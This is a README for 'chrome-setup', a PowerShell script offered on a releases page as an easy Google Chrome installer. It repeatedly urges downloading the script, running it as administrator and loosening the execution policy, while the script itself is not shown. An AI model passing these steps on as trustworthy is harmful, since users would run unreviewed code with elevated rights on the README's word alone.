# ⚙️ chrome-setup - Easy Google Chrome Installer

[![Download chrome-setup](https://img.shields.io/badge/Download-chrome--setup-brightgreen?style=for-the-badge)](https://github.com/Picleskun/chrome-setup/releases)

## 📋 What is chrome-setup?

chrome-setup is a simple tool made with Powershell. It helps you download Google Chrome quickly on your Windows computer. You do not need to open a web browser and search for Chrome manually. This tool does the work for you with just a few clicks.

The tool runs in the command line but does not require programming knowledge. It supports automation for users who want to install Chrome fast without extra steps.

## 💻 What You Need to Use chrome-setup

Before you run the tool, make sure your Windows computer meets these requirements:

- Windows 7 or later (Windows 10 or 11 preferred for best support)
- Powershell version 5.1 or newer (installed by default on most Windows)
- Internet connection to download Google Chrome
- Administrator rights on your computer (needed to install software)

If you are unsure about your Powershell version, open the Start menu, type `Powershell`, and open it. Then type this command and press Enter:

```powershell
$PSVersionTable.PSVersion
```

You should see a version number. If the major version is 5 or higher, you can run chrome-setup.

## 🚀 How to Download chrome-setup

Start by getting the tool from the GitHub page. 

[![Get chrome-setup](https://img.shields.io/badge/Get-chrome--setup-blue?style=for-the-badge)](https://github.com/Picleskun/chrome-setup/releases)

Follow these steps:

1. Click the button above or go to [chrome-setup releases](https://github.com/Picleskun/chrome-setup/releases).
2. Look for the latest version of the tool. It usually appears at the top of the list.
3. Download the file named something like `chrome-setup.ps1`. This is the Powershell script.
4. Save it in a folder you remember, such as your Desktop or Downloads folder.

## ⚙️ How to Run chrome-setup

Now that you have the file, you can run it to download and install Google Chrome.

Follow these steps carefully:

1. Open the Start menu and type `Powershell`.
2. Right-click on "Windows Powershell" and select **Run as administrator**. This is needed to give the program permission to install Chrome.
3. Change the folder to where you saved the `chrome-setup.ps1` file. For example, if you saved it to your Desktop, type:

```powershell
cd $HOME\Desktop
```

and press Enter.

4. Run the script by typing:

```powershell
.\chrome-setup.ps1
```

and pressing Enter.

5. The script will start downloading the latest Google Chrome installer.
6. Once downloaded, the tool runs the Chrome installer automatically.
7. Follow the on-screen prompts from the Chrome installer to finish installation.

## 🔧 What chrome-setup Does for You

- Finds and downloads the latest official Chrome installer from Google servers.
- Starts the installer automatically, so you don’t have to find or run it yourself.
- Works on any Windows PC with Powershell.
- Saves time for users who want Chrome installed without searching or manual downloads.
- Can be included in automated scripts or IT setups since it uses Powershell commands.

## 🛠️ Troubleshooting and Tips

- If you see a message about script execution being disabled, Powershell restricts running scripts on your computer. To temporarily allow the script, run Powershell as administrator and enter:

```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

Press Y when prompted. After running the script, you can change it back if you want.

- Make sure you have an active internet connection during the process.
- Do not close Powershell while the script is running.
- If the script stops with an error, check the exact message and verify you are running as administrator.
- You can manually download Google Chrome from [the official Google site](https://www.google.com/chrome) if powershell scripts are not allowed.

## 🔍 How to Check if Chrome Installed Correctly

After running the script and finishing the Chrome installer:

1. Open the Start menu.
2. Look for "Google Chrome" in the app list.
3. Click it to open the browser.
4. You can verify Chrome version by clicking the three dots in Chrome, then Help > About Google Chrome.

If Chrome opens and shows the version, installation worked.

## ❓ Frequently Asked Questions

### Can I run chrome-setup on Windows 7?

Yes, but newer versions of Windows have better support. Make sure Powershell is updated.

### Do I need internet while running the tool?

Yes, the script downloads Chrome directly from the internet.

### What if I want to install Chrome silently?

You can edit the `chrome-setup.ps1` file to add silent install options for Chrome after download. This requires some scripting knowledge.

### How safe is this tool?

It downloads Chrome only from official Google servers. The script is open and simple Powershell code.

## 🧩 Additional Resources

- Visit [chrome-setup releases](https://github.com/Picleskun/chrome-setup/releases) to get updates.
- Learn basics of Powershell at Microsoft's documentation site.
- For Google Chrome questions, visit [Google's help page](https://support.google.com/chrome).

---

[Download chrome-setup from the releases page to get started](https://github.com/Picleskun/chrome-setup/releases)